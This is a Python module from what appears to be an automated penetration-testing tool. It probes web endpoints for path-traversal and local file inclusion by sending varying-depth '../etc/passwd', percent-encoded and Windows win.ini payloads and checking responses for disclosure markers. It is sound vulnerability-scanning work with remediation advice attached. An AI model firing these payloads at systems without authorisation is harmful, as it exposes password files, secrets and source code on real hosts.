"""Path-traversal / Local File Inclusion (LFI) probe.

Hits endpoints with filename-style query parameters (``name``, ``file``,
``path``, ``doc``, ...) using varying-depth ``../`` payloads. The OS
opens the path verbatim, so any handler that does ``open(BASE / name)``
or naive ``BASE + name`` lets the attacker read arbitrary files.

Three payload families:

1. Raw Linux: ``../../../etc/passwd`` at depths 3-7. Servers in
   /var/www, /home/user/app, etc., need varying depth counts to climb
   back to ``/``.

2. URL-encoded Linux: ``%2e%2e/`` triplets covering filters that strip
   literal ``..`` but pass percent-encoded sequences.

3. Windows: ``..\\..\\..\\windows\\win.ini``. Hits IIS / .NET apps
   without POSIX ``/etc/passwd`` to disclose.

Detection markers in the response body:

  - ``root:x:0:``     Linux /etc/passwd canonical
  - ``[boot loader]`` Windows boot.ini
  - ``[Mail]``        Windows system.ini

Severity: critical. Successful traversal reads arbitrary host files
(secrets, source code, /proc/self/environ, ssh keys), often pivoting
into RCE.
"""
from __future__ import annotations

import logging
from typing import Any
from urllib.parse import quote

from engine.probes import ProbeContext, registry
from engine.probes.auth.runner import auth_headers
from engine.probes.primitives import http_get

logger = logging.getLogger("pentest-ai.probes.web.path_traversal")

DEFAULT_PATHS: tuple[str, ...] = (
    "/files",
    "/file",
    "/download",
    "/api/files",
    "/api/download",
    "/api/file",
    "/uploads",
    "/static",
    "/content",
    "/read",
    "/view",
    "/api/read",
)

FILENAME_PARAMS: tuple[str, ...] = (
    "name",
    "file",
    "filename",
    "path",
    "doc",
    "page",
)

_DEPTHS: tuple[int, ...] = (3, 4, 5, 6, 7)

LINUX_PAYLOADS: tuple[str, ...] = tuple(
    f"{'../' * d}etc/passwd" for d in _DEPTHS
)
ENCODED_LINUX_PAYLOADS: tuple[str, ...] = tuple(
    f"{'%2e%2e/' * d}etc/passwd" for d in _DEPTHS
)
WINDOWS_PAYLOADS: tuple[str, ...] = (
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\..\\windows\\win.ini",
)

ALL_PAYLOADS: tuple[str, ...] = (
    LINUX_PAYLOADS + ENCODED_LINUX_PAYLOADS + WINDOWS_PAYLOADS
)

_PASSWD_SIGN = "root:x:0:"
_WIN_BOOTLOADER = "[boot loader]"
_WIN_MAIL = "[Mail]"


def _find_marker(body: str) -> tuple[str, str] | None:
    """Return (variant, snippet) on a disclosed-content marker, else None."""
    if _PASSWD_SIGN in body:
        idx = body.find(_PASSWD_SIGN)
        return ("linux_etc_passwd", body[idx:idx + 200])
    if _WIN_BOOTLOADER in body or _WIN_MAIL in body:
        marker = _WIN_BOOTLOADER if _WIN_BOOTLOADER in body else _WIN_MAIL
        idx = body.find(marker)
        return ("windows_systemini", body[idx:idx + 200])
    return None


def _emit(
    target: str, payload: str, variant: str, evidence: str,
) -> dict[str, Any]:
    return {
        "title": f"Path traversal: {variant} disclosed on {target}",
        "severity": "critical",
        "category": "injection",
        "target": target,
        "evidence": f"payload={payload[:80]} :: {evidence[:300]}",
        "bug_class": "path_traversal",
        "owasp": "A01:2021",
        "remediation": (
            "Validate the file argument against an allowlist of known "
            "filenames. Resolve the user-supplied path and confirm the "
            "result is under the intended base directory before opening "
            "it (e.g. werkzeug.utils.safe_join). Never concatenate user "
            "input into a filesystem path with no constraint."
        ),
    }


def _build_url(base: str, path: str, param: str, payload: str) -> str:
    sep = "&" if "?" in path else "?"
    encoded = quote(payload, safe="")
    if path.startswith(("http://", "https://")):
        return f"{path}{sep}{param}={encoded}"
    return f"{base.rstrip('/')}{path}{sep}{param}={encoded}"


@registry.probe(
    name="web.path_traversal",
    bug_class="path_traversal",
    severity_max="critical",
    owasp="A01:2021",
    runtime_budget_s=15.0,
    tags=("anonymous", "high-roi", "lfi"),
    requires_auth=False,
)
async def probe_path_traversal(ctx: ProbeContext) -> list[dict[str, Any]]:
    """Walk filename-style params with varying-depth ../etc/passwd payloads."""
    candidates = list(dict.fromkeys(
        list(DEFAULT_PATHS) + list(ctx.candidate_endpoints or ())
    ))[:18]
    extra = auth_headers(ctx.captured_auth)
    findings: list[dict[str, Any]] = []
    seen_targets: set[str] = set()

    for path in candidates:
        if path in seen_targets:
            continue
        fired_here = False
        for param in FILENAME_PARAMS:
            if fired_here:
                break
            for payload in ALL_PAYLOADS:
                url = _build_url(ctx.base, path, param, payload)
                status, _, body = await http_get(
                    ctx.session, url, headers=extra or None,
                )
                if not body:
                    continue
                marker = _find_marker(body)
                if marker is None:
                    continue
                variant, evidence = marker
                findings.append(_emit(url, payload, variant, evidence))
                seen_targets.add(path)
                fired_here = True
                break

    return findings
